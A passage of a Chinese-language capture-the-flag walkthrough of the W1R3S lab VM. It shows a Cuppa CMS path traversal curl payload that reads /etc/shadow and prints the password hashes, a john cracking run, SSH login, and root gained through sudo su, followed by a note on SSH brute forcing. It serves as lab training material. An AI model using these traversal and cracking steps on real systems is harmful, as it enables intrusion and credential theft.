speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false
saned:x:119:127::/var/lib/saned:/bin/false
usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
w1r3s:x:1000:1000:w1r3s,,,:/home/w1r3s:/bin/bash
sshd:x:121:65534::/var/run/sshd:/usr/sbin/nologin
ftp:x:122:129:ftp daemon,,,:/srv/ftp:/bin/false
mysql:x:123:130:MySQL Server,,,:/nonexistent:/bin/false
    </div>
</div>
```

关于这个payload，就是使用curl方法读取alertConfigField.php，参数为urlConfig\=../../../../../../../../../etc/passwd，请求需要使用url编码，但是这一步仍有疑惑。

同样在这一步存在密码hash的地方都是用x代替的，再去读取shadow中

```plain
┌──(kali㉿kali)-[~/桌面]
└─$ curl --data-urlencode urlConfig=../../../../../../../../../etc/shadow http://192.168.152.132/administrator/alerts/alertConfigField.php
<style>
    .new_content{
        position: fixed;
    }
    .alert_config_field{
        font-size:12px;
        background:#FFF;
        position:relative;
        border-radius: 3px;
        box-shadow: 0px 0px 5px rgba(0,0,0,0.2);
        overflow:hidden;
        position:fixed;
        top:50%;
        left:50%;
        width:600px;
        height:440px;
        margin-left:-300px;
        margin-top:-220px;
    }
    .alert_config_top{
        position: relative;
        margin: 2px;
        margin-bottom: 0px;
        border: 1px solid #D2D2D2;
        background: #4489F8;
        overflow: auto;
        color:#FFF;
        font-size: 13px;
        padding: 7px 5px;
        box-shadow: 0 0 2px rgba(0, 0, 0, 0.1);
        text-shadow: 0 1px 1px rgba(0, 0, 0, 0.2);
    }
    .description_alert{
        position:relative;
        font-size:12px;
        text-shadow:0 1px #FFFFFF;
        font-weight: normal;
        padding: 5px 0px 5px 0px;
    }
    .btnClose_alert{
        position:absolute;
        top: 4px; right: 2px;
        width:22px;
        height:22px;
        cursor:pointer;
        background:url(js/cuppa/cuppa_images/close_white.png) no-repeat;
        background-position: center;
        background-size: 13px;
    }
    .content_alert_config{
        position:relative;
        clear:both;
        margin: 2px;
        margin-top: 0px;
        height: 401px;
        padding: 10px;
        overflow: auto;
    }
</style>
<script>
        function CloseDefaultAlert(){
                cuppa.setContent({'load':false, duration:0.2});
        cuppa.blockade({'load':false, duration:0.2, delay:0.1});
        }
</script>
<div class="alert_config_field" id="alert">
    <div class="alert_config_top">
        <strong>Configuration</strong>:         <div class="btnClose_alert" id="btnClose_alert" onclick="CloseDefaultAlert()"></div>
    </div>
    <div id="content_alert_config" class="content_alert_config">
        root:$6$vYcecPCy$JNbK.hr7HU72ifLxmjpIP9kTcx./ak2MM3lBs.Ouiu0mENav72TfQIs8h1jPm2rwRFqd87HDC0pi7gn9t7VgZ0:17554:0:99999:7:::
daemon:*:17379:0:99999:7:::
bin:*:17379:0:99999:7:::
sys:*:17379:0:99999:7:::
sync:*:17379:0:99999:7:::
games:*:17379:0:99999:7:::
man:*:17379:0:99999:7:::
lp:*:17379:0:99999:7:::
mail:*:17379:0:99999:7:::
news:*:17379:0:99999:7:::
uucp:*:17379:0:99999:7:::
proxy:*:17379:0:99999:7:::
www-data:$6$8JMxE7l0$yQ16jM..ZsFxpoGue8/0LBUnTas23zaOqg2Da47vmykGTANfutzM8MuFidtb0..Zk.TUKDoDAVRCoXiZAH.Ud1:17560:0:99999:7:::
backup:*:17379:0:99999:7:::
list:*:17379:0:99999:7:::
irc:*:17379:0:99999:7:::
gnats:*:17379:0:99999:7:::
nobody:*:17379:0:99999:7:::
systemd-timesync:*:17379:0:99999:7:::
systemd-network:*:17379:0:99999:7:::
systemd-resolve:*:17379:0:99999:7:::
systemd-bus-proxy:*:17379:0:99999:7:::
syslog:*:17379:0:99999:7:::
_apt:*:17379:0:99999:7:::
messagebus:*:17379:0:99999:7:::
uuidd:*:17379:0:99999:7:::
lightdm:*:17379:0:99999:7:::
whoopsie:*:17379:0:99999:7:::
avahi-autoipd:*:17379:0:99999:7:::
avahi:*:17379:0:99999:7:::
dnsmasq:*:17379:0:99999:7:::
colord:*:17379:0:99999:7:::
speech-dispatcher:!:17379:0:99999:7:::
hplip:*:17379:0:99999:7:::
kernoops:*:17379:0:99999:7:::
pulse:*:17379:0:99999:7:::
rtkit:*:17379:0:99999:7:::
saned:*:17379:0:99999:7:::
usbmux:*:17379:0:99999:7:::
w1r3s:$6$xe/eyoTx$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb/io7x9q1iP.:17567:0:99999:7:::
sshd:*:17554:0:99999:7:::
ftp:*:17554:0:99999:7:::
mysql:!:17554:0:99999:7:::
    </div>
</div>
```

#### 密码破解

```plain
root:$6$vYcecPCy$JNbK.hr7HU72ifLxmjpIP9kTcx./ak2MM3lBs.Ouiu0mENav72TfQIs8h1jPm2rwRFqd87HDC0pi7gn9t7VgZ0:17554:0:99999:7:::
www-data:$6$8JMxE7l0$yQ16jM..ZsFxpoGue8/0LBUnTas23zaOqg2Da47vmykGTANfutzM8MuFidtb0..Zk.TUKDoDAVRCoXiZAH.Ud1:17560:0:99999:7:::
w1r3s:$6$xe/eyoTx$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb/io7x9q1iP.:17567:0:99999:7:::
```

可能是密码简单，破解起来也很顺利，但是没有root用户的

```plain
┌──(kali㉿kali)-[~/桌面]
└─$ john hash
Warning: detected hash type "sha512crypt", but the string is also recognized as "HMAC-SHA256"
Use the "--format=HMAC-SHA256" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
www-data         (www-data)   
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
computer         (w1r3s)
```

但是也算找到了立足点，先登录一下w1r3s

成功登录

```plain
┌──(kali㉿kali)-[~/桌面]
└─$ ssh w1r3s@192.168.152.132  
The authenticity of host '192.168.152.132 (192.168.152.132)' can't be established.
ED25519 key fingerprint is SHA256:Bue5VbUKeMSJMQdicmcMPTCv6xvD7I+20Ki8Um8gcWM.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.152.132' (ED25519) to the list of known hosts.
----------------------
Think this is the way?
----------------------
Well,........possibly.
----------------------
w1r3s@192.168.152.132's password: 
Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.13.0-36-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

108 packages can be updated.
6 updates are security updates.

.....You made it huh?....
Last login: Mon Jan 22 22:47:27 2018 from 192.168.0.35
w1r3s@W1R3S:~$
```

## 提权

已经给出了明显的提示，作为一个靶场，很确定的就是通过该账户去进行提权操作，当然有兴趣也可以去看看wordpress是否还有什么内容

```plain
----------------------
Think this is the way?
----------------------
Well,........possibly.
----------------------
```

进行一个枚举操作

```plain
w1r3s@W1R3S:~$ whoami
w1r3s
w1r3s@W1R3S:~$ ls
Desktop  Documents  Downloads  examples.desktop  ftp  Music  Pictures  Public  Templates  Videos
w1r3s@W1R3S:~$ id
uid=1000(w1r3s) gid=1000(w1r3s) groups=1000(w1r3s),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
```

有sudo的权限想提权就简单了

```plain
w1r3s@W1R3S:~$ sudo -l
[sudo] password for w1r3s: 
Matching Defaults entries for w1r3s on W1R3S.localdomain:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User w1r3s may run the following commands on W1R3S.localdomain:
    (ALL : ALL) ALL
```

显示有all，直接sudo su

```plain
w1r3s@W1R3S:~$ sudo su
root@W1R3S:/# whoami
root
root@W1R3S:/# whoami
root
root@W1R3S:/# id
uid=0(root) gid=0(root) groups=0(root)
root@W1R3S:/# uname -a
Linux W1R3S 4.13.0-36-generic #40~16.04.1-Ubuntu SMP Fri Feb 16 23:25:58 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
root@W1R3S:/# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:0c:29:60:2f:0a brd ff:ff:ff:ff:ff:ff
    inet 192.168.152.132/24 brd 192.168.152.255 scope global dynamic ens33
       valid_lft 1548sec preferred_lft 1548sec
    inet6 fe80::4564:7ee7:b335:26ec/64 scope link 
       valid_lft forever preferred_lft forever
```

提权成功

拿到flag

```plain
root@W1R3S:/# cd root
root@W1R3S:~# ls
flag.txt
root@W1R3S:~# cat flag.txt 
-----------------------------------------------------------------------------------------
   ____ ___  _   _  ____ ____      _  _____ _   _ _        _  _____ ___ ___  _   _ ____  
  / ___/ _ \| \ | |/ ___|  _ \    / \|_   _| | | | |      / \|_   _|_ _/ _ \| \ | / ___| 
 | |  | | | |  \| | |  _| |_) |  / _ \ | | | | | | |     / _ \ | |  | | | | |  \| \___ \ 
 | |__| |_| | |\  | |_| |  _ <  / ___ \| | | |_| | |___ / ___ \| |  | | |_| | |\  |___) |
  \____\___/|_| \_|\____|_| \_\/_/   \_\_|  \___/|_____/_/   \_\_| |___\___/|_| \_|____/ 
                                                                                    
-----------------------------------------------------------------------------------------

                          .-----------------TTTT_-----_______
                        /''''''''''(______O] ----------____  \______/]_
     __...---'"""\_ --''   Q                               ___________@
 |'''                   ._   _______________=---------"""""""
 |                ..--''|   l L |_l   |
 |          ..--''      .  /-___j '   '
 |    ..--''           /  ,       '   '
 |--''                /           `    \
                      L__'         \    -
                                    -    '-.
                                     '.    /
                                       '-./

----------------------------------------------------------------------------------------
  YOU HAVE COMPLETED THE
               __      __  ______________________   _________
              /  \    /  \/_   \______   \_____  \ /   _____/
              \   \/\/   / |   ||       _/ _(__  < \_____  \ 
               \        /  |   ||    |   \/       \/        \
                \__/\  /   |___||____|_  /______  /_______  /.INC
                     \/                \/       \/        \/        CHALLENGE, V 1.0
----------------------------------------------------------------------------------------

CREATED BY SpecterWires

----------------------------------------------------------------------------------------
```

## 补充

还有一种简便但不推荐的方式，直接使用hashcat或者hydra进行ssh的爆破，最终也是能拿到相同的密码的
